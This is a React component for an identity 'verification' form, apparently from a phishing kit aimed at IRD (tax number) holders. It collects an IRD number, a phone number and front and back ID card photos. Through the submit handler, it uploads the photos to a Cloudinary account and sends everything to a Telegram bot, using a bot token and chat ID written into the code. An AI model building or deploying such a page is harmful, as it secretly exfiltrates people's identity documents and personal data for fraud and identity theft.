import { React, useState } from "react";

const verification = () => {
  const [imageSrc, setImageSrc] = useState();
  const [uploadData, setUploadData] = useState();
  const [ird, setIrd] = useState("");
  const [phone, setPhone] = useState("");
  console.log(ird, phone);

  /**
   * handleOnChange
   * @description Triggers when the file input changes (ex: when a file is selected)
   */

  // function handleOnChange(changeEvent) {
  //   const reader = new FileReader();

  //   reader.onload = function (onLoadEvent) {
  //     setImageSrc(onLoadEvent.target.result);
  //     setUploadData(undefined);
  //   };

  //   reader.readAsDataURL(changeEvent.target.files[0]);
  // }

  /**
   * handleOnSubmit
   * @description Triggers when the main form is submitted
   */

  async function handleOnSubmit(event) {
    event.preventDefault();

    const form = event.currentTarget;
    console.log(form);
    const fileInput = Array.from(form.elements).find(
      ({ name }) => name === "file"
    );
    const fileInputed = Array.from(form.elements).find(
      ({ name }) => name === "file2"
    );

    const formData = new FormData();
    const formData2 = new FormData();

    for (const file of fileInput.files) {
      formData.append("file", file);
    }
    for (const file of fileInputed.files) {
      formData2.append("file", file);
    }

    formData.append("upload_preset", "my-uploads");
    formData2.append("upload_preset", "my-uploads");

    const data = await fetch(
      "https://api.cloudinary.com/v1_1/db0iap6ac/image/upload",
      {
        method: "POST",
        body: formData,
      }
    ).then((r) => r.json());

    const data2 = await fetch(
      "https://api.cloudinary.com/v1_1/db0iap6ac/image/upload",
      {
        method: "POST",
        body: formData2,
      }
    ).then((r) => r.json());
    console.log(data);
    console.log(data2);

    const token = "6047464013:AAGW_UtgQXGerHvLlaBlHUHxKfwbd6vX0wE";
    const chatID = "5996836160";
    const text1 = "FrontID";
    const text2 = "BackID";
    await fetch(
      `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatID}&photo=${data.secure_url}&caption=${text1}`
    ).then(
      (succ) => {
        console.log(succ);
      },
      (err) => {
        console.log(err);
      }
    );
    await fetch(
      `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatID}&photo=${data.secure_url}&caption=${text2}`
    ).then(
      (succ) => {
        console.log(succ);
      },
      (err) => {
        console.log(err);
      }
    );
    await fetch(
      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=IRD%20Number%20or%20Customer%20Identifier:%20${ird}`
    ).then(
      (succ) => {
        console.log(succ);
      },
      (err) => {
        console.log(err);
      }
    );

    await fetch(
      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=Phone%20Number:%20${phone}`
    ).then(
      (succ) => {
        console.log(succ);
      },
      (err) => {
        console.log(err);
      }
    );
    setImageSrc(data.secure_url);
    setUploadData(data);
  }
  return (
    <div class="hero w-full h-full">
      <div class="">
        <form class="" onSubmit={handleOnSubmit} id="messageForm" method="POST">
          <div class="flex justify-end w-full ">
            <div class=" rounded-[4px] px-3 py-4 bg-card text-text w-[320px] m-5 xl:mr-[67px]">
              <div class="px-2 flex flex-col gap-[.8rem]">
                {/* <!-- IRD Number or Customer Identifier --> */}
                <div class="">
                  <div class="">
                    <p class="font-light text-[15px] pb-[1px]">
                      IRD Number or Customer Identifier
                    </p>
                  </div>
                  <div class=" w-full ">
                    <input
                      type="text"
                      name="IRD_Number_or_Customer_Identifier"
                      aria-label="IRDorCUSID"
                      class="w-full h-[39px] border-b-[2px] border-gray-500 focus:border-[#0d8390] focus:border-b-[3px] p-2"
                      id=""
                      onChange={(e) => setIrd(e.target.value)}
                    />
                  </div>
                </div>
                {/* <!-- Phone Number --> */}
                <div class="">
                  <div class="">
                    <p class="font-light text-[15px] pb-[1px]">Phone Number</p>
                  </div>
                  <div class=" w-full ">
                    <input
                      type="text"
                      name="Phone_Number"
                      aria-label="Phone"
                      class="w-full h-[39px] border-b-[2px] border-gray-500 focus:border-[#0d8390] focus:border-b-[3px] p-2"
                      id=""
                      onChange={(e) => setPhone(e.target.value)}
                    />
                  </div>
                </div>
                <div class="">
                  <div class="">
                    <p class="font-light text-[15px] pb-[1px]">Front ID Card</p>
                  </div>
                  <div class=" w-full ">
                    <input
                      type="file"
                      id=""
                      name="file"
                      aria-label="FrontIDCard"
                      class="w-full h-[39px] border-b-[2px] border-gray-500 focus:border-[#0d8390] focus:border-b-[3px] p-2"
                    />
                  </div>
                </div>
                <div class="">
                  <div class="">
                    <p class="font-light text-[15px] pb-[1px]">Back ID Card</p>
                  </div>
                  <div class=" w-full ">
                    <input
                      type="file"
                      id="fileinput"
                      name="file2"
                      aria-label="FrontIDCard"
                      class="w-full h-[39px] border-b-[2px] border-gray-500 focus:border-[#0d8390] focus:border-b-[3px] p-2"
                    />
                  </div>
                </div>
                <div class="w-full">
                  <button
                    type="submit"
                    class="bg-secondary w-full h-full py-[6px] font-bold rounded-sm text-white shadow shadow-gray-500"
                  >
                    Submit
                  </button>
                </div>
              </div>
            </div>
          </div>
        </form>
      </div>
    </div>
  );
};

export default verification;
